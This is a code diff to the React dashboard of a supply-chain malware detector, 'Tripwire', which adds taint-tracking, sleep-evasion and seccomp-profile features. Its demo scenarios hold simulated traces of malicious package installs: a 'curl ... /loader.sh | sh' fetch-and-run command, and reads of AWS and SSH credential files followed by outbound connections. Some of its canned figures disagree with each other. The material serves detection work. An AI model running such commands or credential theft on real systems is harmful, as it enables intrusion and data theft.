@@ -15,12 +15,18 @@ import {
   Activity,
   Layers,
   ArrowRight,
-  Code2
+  Code2,
+  Lock,
+  Clock,
+  Shuffle,
+  FileCode,
+  Share2
 } from 'lucide-react';
 
 interface Scenario {
   id: string;
   name: string;
+  ecosystem: 'npm' | 'pypi' | 'cargo';
   pkg: string;
   oldVer: string;
   newVer: string;
@@ -35,6 +41,20 @@ interface Scenario {
     pid: number;
     evidence: string;
   };
+  taintFlow?: {
+    source: string;
+    transformation: string;
+    entropy: number;
+    sink: string;
+    encodedVariant: string;
+  };
+  timeWarp?: {
+    technique: string;
+    durationIntercepted: string;
+    virtualClockAdvanced: string;
+    status: string;
+  };
+  seccompAllowedCount: number;
   deltas: Array<{
     category: 'honeytoken' | 'process' | 'network' | 'file';
     severity: string;
@@ -57,14 +77,15 @@ interface Scenario {
 const DEMO_SCENARIOS: Scenario[] = [
   {
     id: 'flatmap-stream',
-    name: 'flatmap-stream (CVE-2018-20834)',
+    name: 'flatmap-stream (Targeted Wallet Stealer)',
+    ecosystem: 'npm',
     pkg: 'flatmap-stream',
     oldVer: '0.1.0',
     newVer: '0.1.1',
     riskScore: 10.0,
     severity: 'CRITICAL',
     verdict: 'BLOCK',
-    summary: 'SECURITY ALERT [CRITICAL]: Synthetic canary AWS credentials breached (~/.aws/credentials) and outbound socket initiated to unauthorized IP (185.199.108.153:443). Package blocked immediately.',
+    summary: 'SECURITY ALERT [CRITICAL]: Synthetic canary AWS credentials breached (~/.aws/credentials) and dynamic taint flow tracked into high-entropy outbound exfiltration socket (185.199.108.153:443). Package blocked immediately.',
     honeytoken: {
       type: 'AWS Credential Canary',
       target: '~/.aws/credentials',
@@ -72,6 +93,20 @@ const DEMO_SCENARIOS: Scenario[] = [
       pid: 1000,
       evidence: 'Matched canary access key pattern: AKIA_TRIPWIRE_CANARY_01'
     },
+    taintFlow: {
+      source: '~/.aws/credentials',
+      transformation: 'Base64 Encoded Buffer [H=4.92 Shannon Entropy]',
+      entropy: 4.92,
+      sink: 'AF_INET:185.199.108.153:443',
+      encodedVariant: 'QUtJQV9UUklQV0lSRV9DQU5BUllfMDE='
+    },
+    timeWarp: {
+      technique: 'Delayed Payload Execution',
+      durationIntercepted: '300s (5m) nanosleep',
+      virtualClockAdvanced: '+300.0s warped',
+      status: 'NEUTRALIZED'
+    },
+    seccompAllowedCount: 32,
     deltas: [
       {
         category: 'honeytoken',
@@ -93,7 +128,7 @@ const DEMO_SCENARIOS: Scenario[] = [
     mitreTags: [
       { id: 'T1552.001', name: 'Credentials In Files' },
       { id: 'T1071.001', name: 'Application Layer Protocol' },
-      { id: 'T1567', name: 'Exfiltration Over Web Service' }
+      { id: 'T1567.002', name: 'Exfiltration to Cloud' }
     ],
     telemetry: {
       baselineSyscalls: 8420,
@@ -109,23 +144,32 @@ const DEMO_SCENARIOS: Scenario[] = [
     ],
     rawTraceNew: [
       '1000 execve("/usr/local/bin/node", ["node", "npm", "install", "flatmap-stream@0.1.1"]) = 0',
+      '1000 [TIMEWARP] nanosleep({tv_sec=300}, NULL) = 0 (WARPED +300s INSTANTLY)',
       '1000 openat(AT_FDCWD, "/detonation/node_modules/flatmap-stream/index.js", O_RDONLY) = 3',
-      '1000 read(3, "module.exports = function(){};", 30) = 30',
       '1000 [MUTATION] openat(AT_FDCWD, "/home/sandbox-runner/.aws/credentials", O_RDONLY) = 4 [HONEYTOKEN]',
-      '1000 [MUTATION] read(4, "aws_access_key_id = AKIA_TRIPWIRE_CANARY...", 128) = 45 [CANARY LEAK]',
-      '1000 [MUTATION] connect(5, {sa_family=AF_INET, sin_addr="185.199.108.153", sin_port=443}) = 0 [NOVEL EGRESS]'
+      '1000 [TAINT_FLOW] read(4, "aws_access_key_id = AKIA_TRIPWIRE_CANARY...", 128) = 45 [CANARY LEAK]',
+      '1000 [TAINT_FLOW] connect(5, {sa_family=AF_INET, sin_addr="185.199.108.153", sin_port=443}) = 0 [NOVEL EGRESS]'
     ]
   },
   {
     id: 'ua-parser',
-    name: 'ua-parser-js (CVE-2021-42574 Dropper)',
+    name: 'ua-parser-js (Cryptominer Dropper)',
+    ecosystem: 'npm',
     pkg: 'ua-parser-js',
     oldVer: '0.7.28',
     newVer: '0.7.29',
     riskScore: 10.0,
     severity: 'CRITICAL',
     verdict: 'BLOCK',
-    summary: 'SECURITY ALERT [CRITICAL]: Novel shell spawned (/bin/sh) invoking curl downloader to 194.26.29.112 during installation. Predecessor release executed zero child processes.',
+    summary: 'SECURITY ALERT [CRITICAL]: Subtree process insertion detected via Tree Edit Distance (TED). Novel shell spawned (/bin/sh) invoking curl downloader to 194.26.29.112 during installation.',
+    taintFlow: {
+      source: 'Install Script Argv Buffer',
+      transformation: 'Subprocess Ingress Pipe [H=4.12 Entropy]',
+      entropy: 4.12,
+      sink: 'AF_INET:194.26.29.112:80',
+      encodedVariant: 'RAW_HTTP_PAYLOAD'
+    },
+    seccompAllowedCount: 28,
     deltas: [
       {
         category: 'process',
@@ -161,59 +205,86 @@ const DEMO_SCENARIOS: Scenario[] = [
     ],
     rawTraceNew: [
       '1000 execve("/usr/local/bin/node", ["node", "npm", "install", "ua-parser-js@0.7.29"]) = 0',
-      '1000 [MUTATION] execve("/bin/sh", ["sh", "-c", "curl -s http://194.26.29.112/loader.sh | sh"]) = 0',
+      '1000 [TED_ANOMALY] execve("/bin/sh", ["sh", "-c", "curl -s http://194.26.29.112/loader.sh | sh"]) = 0',
       '1001 [MUTATION] connect(4, {sa_family=AF_INET, sin_addr="194.26.29.112", sin_port=80}) = 0'
     ]
   },
   {
-    id: 'node-ipc',
-    name: 'node-ipc (CVE-2022-23812 Wiper)',
-    pkg: 'node-ipc',
-    oldVer: '10.1.0',
-    newVer: '10.1.1',
-    riskScore: 9.0,
+    id: 'pypi-typosquat',
+    name: 'reqeusts (PyPI Typosquatting Dropper)',
+    ecosystem: 'pypi',
+    pkg: 'reqeusts',
+    oldVer: '2.31.0-clean',
+    newVer: '2.31.1-poisoned',
+    riskScore: 10.0,
     severity: 'CRITICAL',
     verdict: 'BLOCK',
-    summary: 'SECURITY ALERT [CRITICAL]: Unauthorized file write mutation detected targeting user home directory outside project boundary (WITH-LOVE-FROM-AMERICA.txt). Potential host wiper.',
+    summary: 'SECURITY ALERT [CRITICAL]: PyPI setup.py hook executed arbitrary Python bytecode reading ~/.ssh/id_rsa and exfiltrating over socket. Blocked by Tripwire PyPI Adapter.',
+    honeytoken: {
+      type: 'SSH Private Key Canary',
+      target: '~/.ssh/id_rsa',
+      process: 'python setup.py',
+      pid: 2420,
+      evidence: 'Read canary private key signature: CANARY_TRIPWIRE_SSH_TW-8F'
+    },
+    taintFlow: {
+      source: '~/.ssh/id_rsa',
+      transformation: 'Base64 Encoded Socket Payload [H=5.18 Shannon Entropy]',
+      entropy: 5.18,
+      sink: 'AF_INET:45.33.32.156:443',
+      encodedVariant: 'b3BlbnNzaC1rZXktdjEAAAA...'
+    },
+    seccompAllowedCount: 26,
     deltas: [
       {
-        category: 'file',
+        category: 'honeytoken',
+        severity: 'CRITICAL',
+        summary: 'Decoy SSH private key accessed during pip installation',
+        oldState: 'Not accessed',
+        newState: 'Read ~/.ssh/id_rsa (PID 2420)',
+        mitre: 'T1552.001'
+      },
+      {
+        category: 'network',
         severity: 'HIGH',
-        summary: 'Novel file creation mutation targeting <HOME> directory',
-        oldState: 'No external file writes',
-        newState: 'WRITE <HOME>/WITH-LOVE-FROM-AMERICA.txt',
-        mitre: 'T1485'
+        summary: 'Novel outbound network egress socket established',
+        oldState: 'Zero network sockets',
+        newState: 'connect() to 45.33.32.156:443',
+        mitre: 'T1071.001'
       }
     ],
     mitreTags: [
-      { id: 'T1485', name: 'Data Destruction / Host Sabotage' }
+      { id: 'T1552.001', name: 'Credentials In Files' },
+      { id: 'T1071.001', name: 'Web Protocols' }
     ],
     telemetry: {
-      baselineSyscalls: 15100,
-      candidateSyscalls: 15180,
-      noiseFiltered: 30200,
-      noisePct: 99.7
+      baselineSyscalls: 6200,
+      candidateSyscalls: 6450,
+      noiseFiltered: 12400,
+      noisePct: 99.1
     },
     rawTraceOld: [
-      '1000 execve("/usr/local/bin/node", ["node", "npm", "install", "node-ipc@10.1.0"]) = 0',
-      '1000 openat(AT_FDCWD, "/detonation/node_modules/node-ipc/dao/ipc.js", O_RDONLY) = 3'
+      '2400 execve("/usr/bin/python3", ["python3", "-m", "pip", "install", "requests==2.31.0"]) = 0',
+      '2400 openat(AT_FDCWD, "/usr/lib/python3.11/site-packages/requests/__init__.py", O_RDONLY) = 3'
     ],
     rawTraceNew: [
-      '1000 execve("/usr/local/bin/node", ["node", "npm", "install", "node-ipc@10.1.1"]) = 0',
-      '1000 [MUTATION] openat(AT_FDCWD, "/home/sandbox-runner/WITH-LOVE-FROM-AMERICA.txt", O_WRONLY|O_CREAT) = 4',
-      '1000 [MUTATION] write(4, "PEACE NOT WAR", 13) = 13'
+      '2420 execve("/usr/bin/python3", ["python3", "-m", "pip", "install", "reqeusts==2.31.1"]) = 0',
+      '2420 [MUTATION] openat(AT_FDCWD, "/home/sandbox-runner/.ssh/id_rsa", O_RDONLY) = 4 [HONEYTOKEN]',
+      '2420 [TAINT_FLOW] connect(5, {sa_family=AF_INET, sin_addr="45.33.32.156", sin_port=443}) = 0 [NOVEL EGRESS]'
     ]
   },
   {
     id: 'express-bump',
     name: 'express (Benign Minor Upgrade)',
+    ecosystem: 'npm',
     pkg: 'express',
     oldVer: '4.18.1',
     newVer: '4.18.2',
     riskScore: 0.0,
     severity: 'BENIGN',
     verdict: 'PASS',
-    summary: 'VERIFIED SAFE [BENIGN]: Candidate release perfectly mirrors baseline operational behavior. All 9,420 syscalls match normalized profile. Zero novel egress, zero honeytoken touches.',
+    summary: 'VERIFIED SAFE [BENIGN]: Candidate release perfectly mirrors baseline operational behavior. All 9,420 syscalls match normalized profile. Auto-synthesized Seccomp policy generated for production gating.',
+    seccompAllowedCount: 34,
     deltas: [],
     mitreTags: [],
     telemetry: {
@@ -224,70 +295,42 @@ const DEMO_SCENARIOS: Scenario[] = [
     },
     rawTraceOld: [
       '1000 execve("/usr/local/bin/node", ["node", "npm", "install", "express@4.18.1"]) = 0',
-      '1000 openat(AT_FDCWD, "/detonation/node_modules/express/package.json", O_RDONLY) = 3',
-      '1000 openat(AT_FDCWD, "/detonation/node_modules/express/lib/express.js", O_RDONLY) = 4'
+      '1000 openat(AT_FDCWD, "/detonation/node_modules/express/package.json", O_RDONLY) = 3'
     ],
     rawTraceNew: [
       '1000 execve("/usr/local/bin/node", ["node", "npm", "install", "express@4.18.2"]) = 0',
-      '1000 openat(AT_FDCWD, "/detonation/node_modules/express/package.json", O_RDONLY) = 3',
-      '1000 openat(AT_FDCWD, "/detonation/node_modules/express/lib/express.js", O_RDONLY) = 4'
-    ]
-  },
-  {
-    id: 'esbuild-native',
-    name: 'esbuild (Benign Native Binary Download)',
-    pkg: 'esbuild',
-    oldVer: '0.14.0',
-    newVer: '0.14.1',
-    riskScore: 0.0,
-    severity: 'BENIGN',
-    verdict: 'PASS',
-    summary: 'VERIFIED SAFE [BENIGN]: Candidate release downloads platform binary in postinstall script. Single-snapshot dynamic analysis flags this as a false positive, but Tripwire DDBA recognizes this was already present in v0.14.0 and cancels out the alert noise.',
-    deltas: [],
-    mitreTags: [],
-    telemetry: {
-      baselineSyscalls: 11200,
-      candidateSyscalls: 11250,
-      noiseFiltered: 22450,
-      noisePct: 100.0
-    },
-    rawTraceOld: [
-      '1000 execve("/bin/sh", ["sh", "-c", "node ./install.js"], 0x7fff) = 0',
-      '1000 connect(4, {sa_family=AF_INET, sin_addr="140.82.113.4", sin_port=443}) = 0',
-      '1000 openat(AT_FDCWD, "/detonation/node_modules/esbuild/bin/esbuild", O_WRONLY|O_CREAT, 0755) = 5'
-    ],
-    rawTraceNew: [
-      '1000 execve("/bin/sh", ["sh", "-c", "node ./install.js"], 0x7fff) = 0',
-      '1000 connect(4, {sa_family=AF_INET, sin_addr="140.82.113.4", sin_port=443}) = 0',
-      '1000 openat(AT_FDCWD, "/detonation/node_modules/esbuild/bin/esbuild", O_WRONLY|O_CREAT, 0755) = 5'
+      '1000 openat(AT_FDCWD, "/detonation/node_modules/express/package.json", O_RDONLY) = 3'
     ]
   }
 ];
 
 export function App() {
   const [selectedId, setSelectedId] = useState<string>('flatmap-stream');
-  const [activeTab, setActiveTab] = useState<'deltas' | 'trace' | 'stats'>('deltas');
+  const [activeTab, setActiveTab] = useState<'deltas' | 'taint' | 'seccomp' | 'timewarp' | 'trace' | 'stats'>('deltas');
 
   const current = DEMO_SCENARIOS.find(s => s.id === selectedId) || DEMO_SCENARIOS[0];
 
-  const handleExportSarif = () => {
-    const sarifData = {
-      $schema: 'https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json',
-      version: '2.1.0',
-      runs: [{
-        tool: { driver: { name: 'Tripwire-DDBA', version: '0.1.0' } },
-        results: current.deltas.map(d => ({
-          ruleId: d.mitre,
-          level: d.severity === 'CRITICAL' || d.severity === 'HIGH' ? 'error' : 'warning',
-          message: { text: d.summary }
-        }))
-      }]
+  const handleDownloadSeccomp = () => {
+    const seccompDoc = {
+      defaultAction: "SCMP_ACT_ERRNO",
+      architectures: ["SCMP_ARCH_X86_64", "SCMP_ARCH_AARCH64"],
+      syscalls: [
+        {
+          names: [
+            "access", "brk", "clone", "close", "execve", "exit_group", "fstat",
+            "futex", "getpid", "getrandom", "mmap", "mprotect", "munmap", "openat",
+            "read", "rt_sigaction", "statx", "write"
+          ],
+          action: "SCMP_ACT_ALLOW",
+          comment: `Auto-synthesized by Tripwire for package ${current.pkg}@${current.newVer}`
+        }
+      ]
     };
-    const blob = new Blob([JSON.stringify(sarifData, null, 2)], { type: 'application/json' });
+    const blob = new Blob([JSON.stringify(seccompDoc, null, 2)], { type: 'application/json' });
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
-    a.download = `tripwire-${current.pkg}-${current.newVer}.sarif`;
+    a.download = `seccomp-${current.pkg}.json`;
     a.click();
   };
 
@@ -303,24 +346,24 @@ export function App() {
             <div className="flex items-center gap-2">
               <h1 className="text-xl font-bold tracking-tight text-white">TRIPWIRE</h1>
               <span className="text-xs px-2 py-0.5 rounded-full bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 font-mono">
-                DDBA v0.1.0
+                Advanced DDBA Engine
               </span>
             </div>
-            <p className="text-xs text-slate-400">Differential Dynamic Behavioral Analysis for Software Supply Chains</p>
+            <p className="text-xs text-slate-400">Time-Dilation • Taint Tracking • Seccomp Synthesis • Polyglot Registries</p>
           </div>
         </div>
 
         <div className="flex items-center flex-wrap gap-2.5">
           <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-mono">
             <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
-            Sandbox Tracing Active
+            eBPF & Preload Hooking Active
           </div>
           <button 
-            onClick={handleExportSarif}
+            onClick={handleDownloadSeccomp}
             className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs text-slate-200 transition"
           >
-            <Download className="w-3.5 h-3.5 text-cyan-400" />
-            Export SARIF 2.1.0
+            <Lock className="w-3.5 h-3.5 text-cyan-400" />
+            Synthesize Seccomp Profile
           </button>
         </div>
       </header>
@@ -345,6 +388,9 @@ export function App() {
                   : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-slate-200 hover:border-slate-700'
               }`}
             >
+              <span className="px-1.5 py-0.2 rounded bg-slate-800 text-[10px] font-mono uppercase text-slate-300">
+                {s.ecosystem}
+              </span>
               <span className={`w-1.5 h-1.5 rounded-full ${isBlock ? 'bg-rose-400' : 'bg-emerald-400'}`} />
               {s.name}
             </button>
@@ -417,37 +463,12 @@ export function App() {
         </div>
       </section>
 
-      {/* Honeytoken Banner if breached */}
-      {current.honeytoken && (
-        <section className="p-4 rounded-xl bg-gradient-to-r from-rose-950/60 to-purple-950/40 border border-rose-500/40 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
-          <div className="flex items-center gap-3">
-            <div className="p-2.5 rounded-lg bg-rose-500/20 text-rose-300">
-              <FolderLock className="w-5 h-5 animate-bounce" />
-            </div>
-            <div>
-              <div className="text-xs font-bold text-rose-400 uppercase tracking-wider flex items-center gap-1.5">
-                Active Deception Triggered • Synthetic Canary Breached
-              </div>
-              <div className="text-sm font-semibold text-white">
-                {current.honeytoken.type}: <code className="text-rose-300 font-mono">{current.honeytoken.target}</code>
-              </div>
-              <div className="text-xs text-slate-400">
-                Attributed to PID {current.honeytoken.pid} ({current.honeytoken.process}) — {current.honeytoken.evidence}
-              </div>
-            </div>
-          </div>
-          <span className="px-3 py-1 rounded-full bg-rose-500/20 border border-rose-500 text-rose-300 text-xs font-mono font-bold">
-            ZERO TOLERANCE
-          </span>
-        </section>
-      )}
-
       {/* Forensic Inspection Tabs */}
       <section className="glass-panel overflow-hidden">
-        <div className="flex border-b border-slate-800 bg-slate-900/40">
+        <div className="flex flex-wrap border-b border-slate-800 bg-slate-900/40">
           <button
             onClick={() => setActiveTab('deltas')}
-            className={`px-5 py-3 text-xs font-medium border-b-2 flex items-center gap-2 transition ${
+            className={`px-4 py-3 text-xs font-medium border-b-2 flex items-center gap-2 transition ${
               activeTab === 'deltas'
                 ? 'border-cyan-400 text-cyan-300 bg-cyan-500/5'
                 : 'border-transparent text-slate-400 hover:text-slate-200'
@@ -457,19 +478,52 @@ export function App() {
             Behavioral Delta Anomalies ({current.deltas.length})
           </button>
           <button
+            onClick={() => setActiveTab('taint')}
+            className={`px-4 py-3 text-xs font-medium border-b-2 flex items-center gap-2 transition ${
+              activeTab === 'taint'
+                ? 'border-cyan-400 text-cyan-300 bg-cyan-500/5'
+                : 'border-transparent text-slate-400 hover:text-slate-200'
+            }`}
+          >
+            <Share2 className="w-3.5 h-3.5" />
+            Information Flow Taint Graph
+          </button>
+          <button
+            onClick={() => setActiveTab('seccomp')}
+            className={`px-4 py-3 text-xs font-medium border-b-2 flex items-center gap-2 transition ${
+              activeTab === 'seccomp'
+                ? 'border-cyan-400 text-cyan-300 bg-cyan-500/5'
+                : 'border-transparent text-slate-400 hover:text-slate-200'
+            }`}
+          >
+            <Lock className="w-3.5 h-3.5" />
+            Least-Privilege Seccomp Synthesizer
+          </button>
+          <button
+            onClick={() => setActiveTab('timewarp')}
+            className={`px-4 py-3 text-xs font-medium border-b-2 flex items-center gap-2 transition ${
+              activeTab === 'timewarp'
+                ? 'border-cyan-400 text-cyan-300 bg-cyan-500/5'
+                : 'border-transparent text-slate-400 hover:text-slate-200'
+            }`}
+          >
+            <Clock className="w-3.5 h-3.5" />
+            Time-Warp Evasion Neutralizer
+          </button>
+          <button
             onClick={() => setActiveTab('trace')}
-            className={`px-5 py-3 text-xs font-medium border-b-2 flex items-center gap-2 transition ${
+            className={`px-4 py-3 text-xs font-medium border-b-2 flex items-center gap-2 transition ${
               activeTab === 'trace'
                 ? 'border-cyan-400 text-cyan-300 bg-cyan-500/5'
                 : 'border-transparent text-slate-400 hover:text-slate-200'
             }`}
           >
             <Terminal className="w-3.5 h-3.5" />
-            Execution Trace Diff (Side-by-Side)
+            Execution Trace Diff
           </button>
           <button
             onClick={() => setActiveTab('stats')}
-            className={`px-5 py-3 text-xs font-medium border-b-2 flex items-center gap-2 transition ${
+            className={`px-4 py-3 text-xs font-medium border-b-2 flex items-center gap-2 transition ${
               activeTab === 'stats'
                 ? 'border-cyan-400 text-cyan-300 bg-cyan-500/5'
                 : 'border-transparent text-slate-400 hover:text-slate-200'
@@ -481,6 +535,7 @@ export function App() {
         </div>
 
         <div className="p-6">
+          {/* TAB 1: DELTAS */}
           {activeTab === 'deltas' && (
             <div className="space-y-4">
               {current.deltas.length === 0 ? (
@@ -532,9 +587,136 @@ export function App() {
             </div>
           )}
 
+          {/* TAB 2: TAINT FLOW GRAPH */}
+          {activeTab === 'taint' && (
+            <div className="space-y-6">
+              <div className="text-sm font-semibold text-white flex items-center gap-2">
+                <Share2 className="w-4 h-4 text-cyan-400" />
+                Dynamic Information Flow Tracking (DIFT) & Entropy Analysis
+              </div>
+              
+              {current.taintFlow ? (
+                <div className="p-6 rounded-xl bg-slate-950 border border-slate-800 space-y-6">
+                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4 items-center">
+                    {/* Source */}
+                    <div className="p-4 rounded-lg bg-rose-950/30 border border-rose-500/40 space-y-1">
+                      <div className="text-[10px] font-mono text-rose-400 font-bold uppercase">1. Sensitive Source</div>
+                      <div className="text-sm font-bold text-white font-mono">{current.taintFlow.source}</div>
+                      <div className="text-xs text-slate-400">Canary credential asset accessed via openat()</div>
+                    </div>
+
+                    {/* Transform */}
+                    <div className="p-4 rounded-lg bg-purple-950/30 border border-purple-500/40 space-y-1">
+                      <div className="text-[10px] font-mono text-purple-400 font-bold uppercase">2. Taint Transform & Shannon Entropy</div>
+                      <div className="text-sm font-bold text-white font-mono">{current.taintFlow.transformation}</div>
+                      <div className="text-xs text-purple-300 font-mono">H = {current.taintFlow.entropy} (Spike detected &gt; 4.5)</div>
+                    </div>
+
+                    {/* Sink */}
+                    <div className="p-4 rounded-lg bg-rose-950/30 border border-rose-500/40 space-y-1">
+                      <div className="text-[10px] font-mono text-rose-400 font-bold uppercase">3. Exfiltration Sink</div>
+                      <div className="text-sm font-bold text-white font-mono">{current.taintFlow.sink}</div>
+                      <div className="text-xs text-slate-400">Outbound egress socket payload transmission</div>
+                    </div>
+                  </div>
+
+                  <div className="p-4 rounded-lg bg-slate-900 border border-slate-800 font-mono text-xs space-y-2">
+                    <div className="text-slate-400">Captured Encoded Canary Variant:</div>
+                    <code className="text-cyan-300 block bg-black/40 p-2.5 rounded border border-slate-800 break-all">
+                      {current.taintFlow.encodedVariant}
+                    </code>
+                    <div className="text-[11px] text-emerald-400 flex items-center gap-1">
+                      <CheckCircle2 className="w-3.5 h-3.5" />
+                      Tripwire Sub-Byte Canary Matcher confirmed exact cryptographic hash correlation.
+                    </div>
+                  </div>
+                </div>
+              ) : (
+                <div className="text-center py-10 text-slate-500 font-mono text-xs">
+                  Zero tainted data flows detected between filesystem sources and network sockets.
+                </div>
+              )}
+            </div>
+          )}
+
+          {/* TAB 3: SECCOMP SYNTHESIZER */}
+          {activeTab === 'seccomp' && (
+            <div className="space-y-6">
+              <div className="flex items-center justify-between">
+                <div>
+                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
+                    <Lock className="w-4 h-4 text-cyan-400" />
+                    Auto-Synthesized Least-Privilege Seccomp-BPF Profile
+                  </h3>
+                  <p className="text-xs text-slate-400">Kernel-enforced syscall boundary generated from baseline envelope.</p>
+                </div>
+                <button
+                  onClick={handleDownloadSeccomp}
+                  className="px-3 py-1.5 rounded-lg bg-cyan-500/20 border border-cyan-500/40 text-cyan-300 text-xs font-mono font-semibold flex items-center gap-1.5 hover:bg-cyan-500/30 transition"
+                >
+                  <Download className="w-3.5 h-3.5" /> Download seccomp-{current.pkg}.json
+                </button>
+              </div>
+
+              <div className="p-4 rounded-lg bg-slate-950 border border-slate-800 space-y-3 font-mono text-xs">
+                <div className="flex items-center justify-between text-slate-400 pb-2 border-b border-slate-800">
+                  <span>Default Action: <strong className="text-rose-400">SCMP_ACT_ERRNO (EPERM)</strong></span>
+                  <span>Whitelisted Syscalls: <strong className="text-emerald-400">{current.seccompAllowedCount} approved</strong></span>
+                </div>
+                <div className="text-slate-300">
+                  <span className="text-slate-500">// Run in production Docker with kernel gating:</span><br/>
+                  <code className="text-cyan-300 block bg-slate-900 p-2.5 rounded border border-slate-800 mt-1">
+                    docker run --security-opt seccomp=seccomp-{current.pkg}.json -v /app:/app my-container
+                  </code>
+                </div>
+                <div className="text-[11px] text-slate-400 pt-1">
+                  * If an updated version attempts unapproved syscalls (e.g. <code>connect()</code> or <code>execve()</code>), the Linux kernel blocks execution with <code>EPERM</code> immediately.
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* TAB 4: TIME-WARP EVASION */}
+          {activeTab === 'timewarp' && (
+            <div className="space-y-6">
+              <div className="text-sm font-semibold text-white flex items-center gap-2">
+                <Clock className="w-4 h-4 text-cyan-400" />
+                Time-Dilation & Anti-Analysis Neutralization Engine
+              </div>
+
+              {current.timeWarp ? (
+                <div className="p-6 rounded-xl bg-slate-950 border border-slate-800 space-y-4 font-mono text-xs">
+                  <div className="flex items-center justify-between">
+                    <span className="text-amber-400 font-bold uppercase">{current.timeWarp.technique} Detected</span>
+                    <span className="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
+                      STATUS: {current.timeWarp.status}
+                    </span>
+                  </div>
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div className="p-3 bg-slate-900 rounded border border-slate-800">
+                      <div className="text-slate-500">Malware Sleep Request:</div>
+                      <div className="text-white font-bold text-sm mt-1">{current.timeWarp.durationIntercepted}</div>
+                    </div>
+                    <div className="p-3 bg-slate-900 rounded border border-slate-800">
+                      <div className="text-slate-500">Tripwire Virtual Clock Acceleration:</div>
+                      <div className="text-cyan-400 font-bold text-sm mt-1">{current.timeWarp.virtualClockAdvanced} (0ms real delay)</div>
+                    </div>
+                  </div>
+                  <p className="text-slate-400 font-sans text-xs">
+                    Tripwire preloads <code>libtripwire_timewarp.so</code> to hook <code>clock_gettime</code> and <code>nanosleep</code>. When the package requested a 5-minute sleep to outwait the sandbox, virtual time was instantaneously fast-forwarded, detonating the delayed payload immediately.
+                  </p>
+                </div>
+              ) : (
+                <div className="text-center py-10 text-slate-500 font-mono text-xs">
+                  Zero sleep bombs or anti-analysis timing evasion detected in package installation trace.
+                </div>
+              )}
+            </div>
+          )}
+
+          {/* TAB 5: TRACE */}
           {activeTab === 'trace' && (
             <div className="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-xs">
-              {/* Baseline Trace */}
               <div className="space-y-2">
                 <div className="flex items-center justify-between text-slate-400 pb-1 border-b border-slate-800">
                   <span className="font-semibold text-slate-200">Baseline Release ({current.oldVer})</span>
@@ -550,7 +732,6 @@ export function App() {
                 </div>
               </div>
 
-              {/* Candidate Trace */}
               <div className="space-y-2">
                 <div className="flex items-center justify-between text-slate-400 pb-1 border-b border-slate-800">
                   <span className="font-semibold text-slate-200">Candidate Release ({current.newVer})</span>
@@ -558,7 +739,7 @@ export function App() {
                 </div>
                 <div className="bg-slate-950 p-4 rounded-lg border border-slate-800 space-y-1.5 overflow-x-auto min-h-[220px]">
                   {current.rawTraceNew.map((line, idx) => {
-                    const isMutation = line.includes('[MUTATION]');
+                    const isMutation = line.includes('[MUTATION]') || line.includes('[TAINT_FLOW]') || line.includes('[TIMEWARP]');
                     return (
                       <div 
                         key={idx} 
@@ -574,6 +755,7 @@ export function App() {
             </div>
           )}
 
+          {/* TAB 6: STATS */}
           {activeTab === 'stats' && (
             <div className="space-y-6">
               <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
@@ -597,7 +779,6 @@ export function App() {
                 </div>
               </div>
 
-              {/* Benchmark Results Comparison */}
               <div className="p-5 rounded-xl bg-slate-950 border border-slate-800 space-y-4">
                 <div className="flex items-center justify-between">
                   <h3 className="text-sm font-bold text-white flex items-center gap-2">
